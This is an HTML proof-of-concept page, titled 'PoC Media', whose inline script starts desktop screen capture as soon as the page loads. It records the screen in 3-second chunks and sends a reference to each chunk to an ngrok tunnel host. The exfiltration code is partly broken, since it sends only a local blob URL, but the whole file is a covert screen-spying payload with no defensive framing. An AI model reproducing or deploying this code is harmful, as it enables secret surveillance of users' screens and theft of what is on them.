<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PoC Media</title>
</head>
<body>
  <video controls id="output"></video>

  <script>
    // Stream capture
    const constraints = {
      video: {
        mandatory: {
          chromeMediaSource: 'desktop',
          minWidth: 1280,
          maxWidth: 1280,
          minHeight: 720,
          maxHeight: 720
        },
      },
    };

    let mediaRecorder; // Variable to store the MediaRecorder instance
    let intervalId; // Interval identifier for recording and sending video

    function startRecording() {
      navigator.getUserMedia(constraints, (stream) => {
        mediaRecorder = new MediaRecorder(stream);
        let chunks = []; // Array to store video data

        mediaRecorder.ondataavailable = (e) => {
          chunks.push(e.data);
        }

        mediaRecorder.start();

        // Function to record and send video every 3 seconds
        function recordAndSendVideo() {
          setTimeout(() => {
            mediaRecorder.stop();
            const blob = new Blob(chunks, { type: 'video/webm' });
            chunks = []; // Clear the array for the next video data
            const videoUrl = URL.createObjectURL(blob);
            sendVideoUrl(videoUrl); // Call function to send video URL as a parameter
            mediaRecorder.start(); // Start a new recording
            recordAndSendVideo(); // Recursive call for the next iteration
          }, 3000);
        }

        recordAndSendVideo(); // Start the first iteration of recording and sending video
      }, (err) => {
        console.log(err);
      });
    }

    // Function to send video URL as a parameter in a GET request
    function sendVideoUrl(videoUrl) {
      const requestUrl = 'https://ea0b-95-106-68-53.ngrok-free.app' + encodeURIComponent(videoUrl);

      fetch(requestUrl)
        .then(response => {
          // Handle the server response
          console.log('Video URL successfully sent to the server.');
        })
        .catch(error => {
          // Handle errors when sending video URL
          console.error('Error sending video URL to the server:', error);
        });
    }

    startRecording(); // Start recording and sending video when the page loads
  </script>
</body>
</html>
